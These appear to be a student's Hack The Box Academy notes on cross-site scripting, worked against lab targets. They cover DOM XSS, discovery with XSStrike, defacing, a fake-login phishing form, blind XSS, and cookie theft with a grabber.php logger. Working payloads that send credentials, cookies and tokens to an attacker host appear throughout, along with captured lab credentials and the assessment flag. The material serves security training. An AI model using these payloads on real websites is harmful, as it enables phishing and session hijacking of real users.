# HTB Cross-Side-Request (XSS) Module

## DOM Attacks

If we try the XSS payload we have been usaing previously, we will see that it will not execute. This is because the `innerHTML` function does not allow the use of the `<script>` tags within it as a security feature.

 ![ALT](/HTB/Web_Penetration_Tester/Cross_site_scripting/Images/1.png)

Still, there are many other XSS payloads we use that do not contain `<script>` tags, like the following XSS payload:

```html
<img src="" onerror=alert(window.origin)>
```

The above line creates a new HTML image object, which has a `onerror` attribute that can execute JavaScript code when the image is not found. So, as we provided an empty image link (`""`), our code should always get executed without having to use `<script>` tags:

 ![ALT](/HTB/Web_Penetration_Tester/Cross_site_scripting/Images/2.png)

To target a user with this DOM XSS vulnerability, we can once again copy the URL from the browser and share it with them, and once they visit it, the JavaScript code should execute. Both of these payloads are among the most basic XSS payloads. There are many instances where we may need to use various payloads depending on the security of the web application and the browser, which we will discuss in the next section.

```jsx
http://83.136.251.105:50900/?#task=%3Cimg%20src=%22%22%20onerror=alert(document.cookie)%3E
```

## Discovering XSS

### Automated Discovery

- **Scanner Capabilities:** Vulnerability scanners (e.g., Nessus, Burp Pro, ZAP) use **Passive Scanning** to analyze client-side code for DOM-based XSS, and **Active Scanning** to inject payloads into the page source.
- **Open-Source Tools:** open-source alternatives like **XSStrike, Brute XSS, and XSSer** can effectively identify input fields and inject test payloads.
- **The Need for Manual Verification:** Open-source tools detect vulnerabilities by checking if a payload is successfully rendered in the page source. However, because rendering does not guarantee execution, **manual verification is always required**.

---

### Manual Discovery

Manual discovery ranges from basic payload testing to advanced code analysis, depending on the application's security level.

- **XSS Payloads:** *PayloadAllTheThings*
- **Payload Variety:** Many public payloads will fail on standard inputs because they are highly specialized—either tailored for specific injection points (like breaking out of HTML attributes) or designed to evade filters using `<script>`, `<img>`, or CSS vectors.
- **Custom Automation:** Copying and pasting payloads manually is inefficient. A more advanced and efficient approach involves writing custom Python scripts to automate payload delivery and analyze how the target web application renders them.

---

### Code Review

- **The Gold Standard:** Manual code review of both the back-end and front-end is the most reliable method for detecting XSS. Understanding how data flows from the input to the browser allows for the creation of high-confidence, custom payloads.
- **Bypassing Patches:** Well-established applications routinely patch vulnerabilities found by automated scanners. For these targets, manual code review is often the only way to uncover hidden XSS vulnerabilities that survived public release.

### Challange

**Utilize some of the techniques mentioned in this section to identify the vulnerable input parameter found in the above server. What is the name of the vulnerable parameter?**

Using xsstrike tool to automate the xss discovery

```jsx
 python3 xsstrike.py -u "http://83.136.252.32:39489/?fullname=test&username=test&password=test&email=test%40gmail.com" 

        XSStrike v3.1.5                                                                         
                                                                                                
[~] Checking for DOM vulnerabilities 
[+] WAF Status: Offline 
[!] Testing parameter: fullname 
[-] No reflection found 
[!] Testing parameter: username 
[-] No reflection found 
[!] Testing parameter: password 
[-] No reflection found 
[!] Testing parameter: email 
[!] Reflections found: 1 
[~] Analysing reflections 
[~] Generating payloads 
[!] Payloads generated: 3071 
------------------------------------------------------------
[+] Payload: <a%0aonmOUsEOVer+=+(prompt)``>v3dm0s 
[!] Efficiency: 100 
[!] Confidence: 10 
[?] Would you like to continue scanning? [y/N] y
------------------------------------------------------------
[+] Payload: <detaILS%09onpOiNTERentER%0a=%0a(prompt)``%0dx// 
[!] Efficiency: 100 
[!] Confidence: 10 
[?] Would you like to continue scanning? [y/N] y
------------------------------------------------------------
[+] Payload: <A%09oNMoUsEOver%09=%09confirm()%0dx>v3dm0s 
[!] Efficiency: 100 
[!] Confidence: 10 
[?] Would you like to continue scanning? [y/N] y
------------------------------------------------------------
[+] Payload: <d3v%0aoNMouseoVEr%0d=%0dconfirm()>v3dm0s 
[!] Efficiency: 100 
[!] Confidence: 10 
[?] Would you like to continue scanning? [y/N] y
------------------------------------------------------------
[+] Payload: <deTAiLS%0dOnpOiNTErENter%09=%09confirm()%0dx// 
[!] Efficiency: 100 
[!] Confidence: 10 
[?] Would you like to continue scanning? [y/N] y
------------------------------------------------------------
[+] Payload: <a%0doNMoUSeOveR+=+(confirm)()%0dx>v3dm0s 
[!] Efficiency: 100 
[!] Confidence: 10 
[?] Would you like to continue scanning? [y/N] n
```

our payload got injected into the source code

 ![ALT](/HTB/Web_Penetration_Tester/Cross_site_scripting/Images/3.png)

 ![ALT](/HTB/Web_Penetration_Tester/Cross_site_scripting/Images/4.png)

in the email section: the result will be reflected in the console tab

```jsx
<script>console.log("Test XSS from the search bar of page XYZ\n".concat(document.domain).concat("\n").concat(window.origin))</script>
```

- **`document.domain`**: This property retrieves the hostname of the server that served the document
- **`window.origin`**: This property retrieves the origin of the global window, which includes the protocol, domain, and port number

 ![ALT](/HTB/Web_Penetration_Tester/Cross_site_scripting/Images/5.png)

the result will be reflected in the console tab. The first payload confirmed the exact host and port. Once we know the application's structure, we use `history.replaceState` to manipulate the browser’s address bar. This method changes the URL displayed in the user's browser to look like they are on the actual `/login` page of that IP/port, **without** triggering a page reload. This makes the attack highly convincing, as a victim looking at the URL bar would believe they have genuinely been redirected to a legitimate login endpoint.

```jsx
<script>
history.replaceState(null, null, '../../../login');
document.body.innerHTML = "</br></br></br></br></br><h1>Please login to continue</h1><form>Username: <input type='text'>Password: <input type='password'></form><input value='submit' type='submit'>"
</script>
```

 ![ALT](/HTB/Web_Penetration_Tester/Cross_site_scripting/Images/6.png)

# **XSS Attacks**

## Defacing

**Website defacing** means **changing the appearance of a website** so that visitors see a message from the attacker, usually to show that the site was hacked.

It is commonly done using **Stored XSS**, because the malicious script is **saved on the server** and runs for **every visitor** who loads the page.

---

### Main Elements Used in Defacing

Attackers usually modify **four main parts of the webpage** using JavaScript.

### 1. Change Background Color

Attackers can change the page background using:

```html
document.body.style.background
```

Example payload:

```html
<script>document.body.style.background="#141d2b"</script>
What is this?
```

They can also set an **image as the background**:

```html
<script>document.body.background="image_url"</script>
What is this?
```

---

### 2. Change Page Title

The browser tab title can be changed using:

```jsx
document.title
```

Example:

```html
<script>document.title='HackTheBox Academy'</script>
What is this?
```

---

### 3. Change Page Text

Attackers can modify the text of a specific element using:

```html
element.innerHTML
```

Example:

```html
document.getElementById("todo").innerHTML="New Text"
```

---

### 4. Replace the Entire Page Content

Attackers often replace the **entire body of the page** with their own HTML message.

Example:

```
document.getElementsByTagName('body')[0].innerHTML
```

Payload example:

```
<script>
document.getElementsByTagName('body')[0].innerHTML=
'<center><h1 style="color:white">Cyber Security Training</h1></center>'
</script>
What is this?
```

This removes the visible content of the page and replaces it with the attacker's message.

---

## Important Note

The **original website code still exists**, but the injected JavaScript **executes when the page loads** and changes the appearance of the page for users.

## Phishing

### What is an XSS Phishing Attack?

An **XSS phishing attack** tricks victims into entering **sensitive information (like usernames and passwords)** through a **fake login form** injected into a vulnerable website.

Because the page belongs to a **trusted website**, victims are more likely to trust the form and enter their credentials.

---

### 1. Finding the XSS Vulnerability

The vulnerable page is an **image viewer**:

```
/phishing/index.php?url=
```

The user can submit an image URL. Example:

```
index.php?url=https://example.com/image.png
```

When a normal XSS payload like this is injected:

```html
<script>alert(window.origin)</script>

```

It **does not execute**, so we must inspect how the input is displayed in the HTML source and find a **working XSS payload**.

---

### 2. Injecting a Fake Login Form

Once we find a working XSS payload, we inject **HTML code for a fake login form**. Example login form:

```html
<h3>Please login to continue</h3>
<formaction=http://OUR_IP>
<inputtype="username"name="username"placeholder="Username">
<inputtype="password"name="password"placeholder="Password">
<inputtype="submit"value="Login">
</form>
```

This form sends the credentials to the **attacker's server (OUR_IP)**.

---

### 3. Writing HTML Using JavaScript

To display the login form on the page, we use:

```jsx
document.write()
```

Example:

```jsx
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" value="Login"></form>');
```

This replaces part of the page with the **fake login form**.

 ![ALT](/HTB/Web_Penetration_Tester/Cross_site_scripting/Images/7.png)

---

### 4. Removing the Original Page Content

The original **image URL form** is still visible, so we remove it to make the page look legitimate.

Using JavaScript:

```jsx
document.getElementById('urlform').remove();
```

This removes the original input form from the page.

---

### 5. Cleaning Remaining HTML

e can see that the URL field is still displayed, which defeats our line of "`Please login to continue`". So, to encourage the victim to use the login form, we should remove the URL field, such that they may think that they have to log in to be able to use the page. To do so, we can use the JavaScript function 

```jsx
document.getElementById().remove().
```

To find the `id`of the HTML element we want to remove, we can open the `Page Inspector Picker`

by clicking CTRL+SHIFT+C and then clicking on the element we need:

 ![ALT](/HTB/Web_Penetration_Tester/Cross_site_scripting/Images/8.jpeg)

As we see in both the source code and the hover text, the `url` form has the id `urlform`:

```html
<form role="form" action="index.php" method="GET" id='urlform'>
<input type="text" placeholder="Image URL" name="url"></form>
```

So, we can now use this id with the `remove()` function to remove the URL form:

```jsx
document.getElementById('urlform').remove();
```

Now, once we add this code to our previous JavaScript code (after the `document.write` function), we can use this new JavaScript code in our payload:

```jsx
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
```

When we try to inject our updated JavaScript code, we see that the URL form is indeed no longer displayed:

 ![ALT](/HTB/Web_Penetration_Tester/Cross_site_scripting/Images/9.jpeg)

We also see that there's still a piece of the original HTML code left after our injected login form. This can be removed by simply commenting it out, by adding an HTML opening comment after our XSS payload:

```html
...PAYLOAD...<!--
```

As we can see, this removes the remaining bit of original HTML code, and our payload should be ready. 

---

### 6. Stealing Credentials

When the victim enters credentials, the form sends them to the attacker's machine. Example request captured:

```
GET /?username=test&password=test
```

The attacker can capture this using **Netcat**:

```
sudonc-lvnp80
```

---

### 7. Making the Attack Less Suspicious

Using Netcat causes an error page for the victim. Instead, attackers run a **PHP server** that:

1. Saves the credentials
2. Redirects the victim back to the original page

Example PHP script:

```php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt","a+");
    fputs($file,"Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
}
```

Run the server:

```
sudo php-S0.0.0.0:80
```

Now credentials are stored in:

```
creds.txt
```

Example result:

```
Username: test | Password: test
```

### login injection

```bash
document.write('<h3>Please login to continue</h3><form action=http://10.10.16.15><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

```bash
$ nc -lvnp 4444                                                                             
listening on [any] 4444 ...
connect to [10.10.16.15] from (UNKNOWN) [10.10.16.15] 48504
GET /?username=test&password=pass123&submit=Login HTTP/1.1
Host: 10.10.16.15:4444
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:146.0) Gecko/20100101 Firefox/146.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://10.129.234.166/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

```

### Challenge

Q.  **Try to find a working XSS payload for the Image URL form found at '/phishing' in the above server, and then use what you learned in this section to prepare a malicious URL that injects a malicious login form. Then visit '/phishing/send.php' to send the URL to the victim, and they will log into the malicious login form. If you did everything correctly, you should receive the victim's login credentials, which you can use to login to '/phishing/login.php' and obtain the flag.** 

index.php

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://10.129.92.169/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

Craft a reflected xss payload that will redender a login form

```bash
http://10.129.92.169/phishing/index.php?url=%27document.write(%27%3Ch3%3EPlease%20login%20to%20continue%3C/h3%3E%3Cform%20action=http://10.10.16.15%3E%3Cinput%20type=%22username%22%20name=%22username%22%20placeholder=%22Username%22%3E%3Cinput%20type=%22password%22%20name=%22password%22%20placeholder=%22Password%22%3E%3Cinput%20type=%22submit%22%20name=%22submit%22%20value=%22Login%22%3E%3C/form%3E%27);
```

Then post the crafted url into the send.php page, from there, the victim will type his credentials in the login form and our listener will capture the request

 ![ALT](/HTB/Web_Penetration_Tester/Cross_site_scripting/Images/10.png)

```bash
 cat creds.txt 

Username: admin | Password: p1zd0nt57341myp455
```

## Session Hijacking

hijack a victim's session data to log in to their account

## Blind XSS Detection

We usually start XSS attacks by trying to discover if and where an XSS vulnerability exists. However, in this exercise, we will be dealing  with a `Blind XSS` vulnerability. A Blind XSS vulnerability occurs when the vulnerability is triggered on a page we don't have access to.

Blind XSS vulnerabilities usually occur with forms only accessible by certain users (e.g., Admins). Some potential examples include:

- Contact Forms
- Reviews
- User Details
- Support Tickets
- HTTP User-Agent header

how would we be able to detect an XSS vulnerability if we cannot see how the output is handled?

### Example:

We have a login form 

 ![ALT](/HTB/Web_Penetration_Tester/Cross_site_scripting/Images/11.png)

and once we submit the form, we get the following message:

 ![ALT](/HTB/Web_Penetration_Tester/Cross_site_scripting/Images/12.jpeg)

This indicates that we will not see how our input will be handled or how it will look in the browser, since it will appear for the Admin only in a certain Admin Panel that we do not have access to. For that reason, we will use these payloads: 

```html
from PayloadsAllTheThings:
Code: html<script src=http://OUR_IP></script>

'><script src=http://OUR_IP></script>

"><script src=http://OUR_IP></script>

javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')

<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>

<script>$.getScript("http://OUR_IP")</script>
```

In each field, inject one of these payloads into it and start a listener to capture any response. 

```bash
sudo php  -S 10.10.16.18:80
```

Inject into the fullname field: 

```html
'><script src=http://10.10.16.18/fullname></script>

<script src=http://10.10.16.18/fullname></script>

javascript:eval('var a=document.createElement(\'script\');a.src=\'http://10.10.16.18/fullname\';document.body.appendChild(a)')

<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "http://10.10.16.18/username");a.send();</script>
```

No connection received. 

Test-2: inject into the username field

```html
'><script src=http://10.10.16.18/username></script>
<script src=http://10.10.16.18/username></script>
"><script src=http://10.10.16.18/username></script>
```

```html
"><script+src%3dhttp%3a//10.10.16.18/imgurl></script> 
<script>$.getScript("http://10.10.16.18/imgurl")</script>
```

 ![ALT](/HTB/Web_Penetration_Tester/Cross_site_scripting/Images/13.png)

```html
 sudo php  -S 10.10.16.18:80
[Tue Jan 13 12:33:20 2026] PHP 8.2.10 Development Server (http://10.10.16.18:80) started
[Tue Jan 13 12:44:28 2026] 10.129.89.2:35744 Accepted
[Tue Jan 13 12:44:29 2026] 10.129.89.2:35744 [200]: GET /imgurl
[Tue Jan 13 12:44:29 2026] 10.129.89.2:35744 Closing
```

```html
<script>document.location='http://10.10.16.18:8080/grabber.php?c='+document.cookie</script>
```

```html
<script>document.location='http://10.10.16.18:8080/grabber.php?c='+document.cookie</script>
<script>document.location='http://10.10.16.18:8080/grabber.php?c='+localStorage.getItem('access_token')</script>
<script>new Image().src="http://10.10.16.18:8080/cookie.php?c="+document.cookie;</script>
<script>new Image().src="http://10.10.16.18:8080/cookie.php?c="+localStorage.getItem('access_token');</script>
```

**Cookie Hijacking:** 

Now that we know the vulnerable field, inject a payload to capture the admin’s cookie. What we need:

- js payload that fetch a php script from our machine
- and php file that saves the response into a text file.

**script.js**

```jsx
new Image=http://10.10.16.18:8080/grabber.php?c='+document.cookie
```

**grabber.php**

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>

```

Now, inject the imgurl field to fetch script.js file from our machine

```html
"><script src=http://10.10.16.18:8080/script.js></script>
```

but that didnt work and retuned this error: 

```jsx
 sudo php  -S 10.10.16.18:8080
[Tue Jan 13 13:38:18 2026] PHP 8.2.10 Development Server (http://10.10.16.18:8080) started
[Tue Jan 13 13:42:15 2026] 10.129.89.2:34404 Accepted
[Tue Jan 13 13:42:15 2026] 10.129.89.2:34404 [200]: GET /script.js
[Tue Jan 13 13:42:15 2026] 10.129.89.2:34404 Closing
[Tue Jan 13 13:42:15 2026] 10.129.89.2:34406 Accepted
[Tue Jan 13 13:42:17 2026] 10.129.89.2:34406 Closed without sending a request; it was probably just an unused speculative preconnection
[Tue Jan 13 13:42:17 2026] 10.129.89.2:34406 Closing
```

I solved this issue by directly injecting the field with this payload to fetch the grabber.php file

```html
"><script>new Image().src="http://10.10.16.18:8080/grabber.php?c="+document.cookie;</script>
```

response:

```bash
 sudo php  -S 10.10.16.18:8080
[Tue Jan 13 14:32:30 2026] PHP 8.2.10 Development Server (http://10.10.16.18:8080) started
[Tue Jan 13 14:32:37 2026] 10.129.89.2:35514 Accepted
[Tue Jan 13 14:32:37 2026] 10.129.89.2:35514 [200]: GET /grabber.php?c=cookie=c00k1355h0u1d8353cu23d
[Tue Jan 13 14:32:37 2026] 10.129.89.2:35514 Closing
[Tue Jan 13 14:32:38 2026] 10.129.89.2:35516 Accepted
[Tue Jan 13 14:32:38 2026] 10.129.89.2:35516 Closed without sending a request; it was probably just an unused speculative preconnection
[Tue Jan 13 14:32:38 2026] 10.129.89.2:35516 Closing
```

result: 

```bash
cat cookies.txt           
Victim IP: 10.129.89.2 | Cookie: cookie=c00k1355h0u1d8353cu23d
```

Now we can login into the admin account with the captured cookie by setting the `Cookie` header  

 ![ALT](/HTB/Web_Penetration_Tester/Cross_site_scripting/Images/14.png)

# Skill Assessment

Apply the skills you learned in this module to achieve the following:

1. Identify a user-input field that is vulnerable to an XSS vulnerability
2. Find a working XSS payload that executes JavaScript code on the target's browser
3. Using the `Session Hijacking` techniques, try to steal the victim's cookies, which should contain the flag

Discovering XSS

```bash
 python3 ../../Tools/XSStrike/xsstrike.py -u "http://10.129.87.55/assessment/" --crawl        

        XSStrike v3.1.5                                                                 
                                                                                        
[~] Crawling the target 
[+] Potentially vulnerable objects found at http://10.129.87.55/assessment/ 
------------------------------------------------------------
2   ( Element.prototype.matches && Element.prototype.closest && window.NodeList && NodeList.prototype.forEach ) || document.write( '<script src="http://10.129.87.55/assessment/wp-content/themes/twentytwentyone/assets/js/polyfills.js?ver=1.3"></scr' + 'ipt>' );
2       /(trident|msie)/i.test(navigator.userAgent)&&document.getElementById&&window.addEventListener&&window.addEventListener("hashchange",(function(){var t,e=location.hash.substring(1);/^[A-z0-9_-]+$/.test(e)&&(t=document.getElementById(e))&&(/^(?:a|select|input|button|textarea)$/i.test(t.tagName)||(t.tabIndex=-1),t.focus())}),!1);
------------------------------------------------------------
[++] Vulnerable webpage: http://10.129.87.55/assessment/ 
[++] Vector for s: <htML%0donPOiNtErenter%0a=%0a[8].find(confirm)// 
 !] Progress: 4/4
```

 ![ALT](/HTB/Web_Penetration_Tester/Cross_site_scripting/Images/s1.png)

in the comment section, the comment must be approved by the admin, so we are dealing with blind xss 

```bash
comment=test&author=test&email=test@gmail.com&url=http%3A%2F%2Ftest.com&submit=Post+Comment&comment_post_ID=8&comment_parent=0
```

I kept testing for these parameters till i found the vulnerable on:  

```bash
'><script src=http://10.10.16.18/url></script>
```

 ![ALT](/HTB/Web_Penetration_Tester/Cross_site_scripting/Images/s2.png)

Now that we found the target parameter, repeat the step from the last session hijacking lesson. 

```bash
"><script>new Image().src="http://10.10.16.18:808/grabber.php?c="+document.cookie;</script>
```

set up a listener so the target fetch grabber.php file from our machine which will save the captured cookie into a file

```bash
$ sudo php  -S 10.10.16.18:80
[Tue Jan 13 16:51:54 2026] PHP 8.2.10 Development Server (http://10.10.16.18:80) started
[Tue Jan 13 16:52:55 2026] 10.129.87.55:56998 Accepted
[Tue Jan 13 16:52:55 2026] 10.129.87.55:57000 Accepted
[Tue Jan 13 16:52:55 2026] 10.129.87.55:56998 [200]: GET /grabber.php?c=wordpress_test_cookie=WP%20Cookie%20check;%20wp-settings-time-2=1768312270;%20flag=HTB{cr055_5173_5cr1p71n6_n1nj4}
[Tue Jan 13 16:52:55 2026] 10.129.87.55:56998 Closing
[Tue Jan 13 16:52:56 2026] 10.129.87.55:57000 Closed without sending a request; it was probably just an unused speculative preconnection
[Tue Jan 13 16:52:56 2026] 10.129.87.55:57000 Closing

```

```bash
$ cat cookies.txt 
Victim IP: 10.129.87.55 | Cookie: wordpress_test_cookie=WP Cookie check
Victim IP: 10.129.87.55 | Cookie:  wp-settings-time-2=1768312270
Victim IP: 10.129.87.55 | Cookie:  flag=HTB{cr055_5173_5cr1p71n6_n1nj4}
```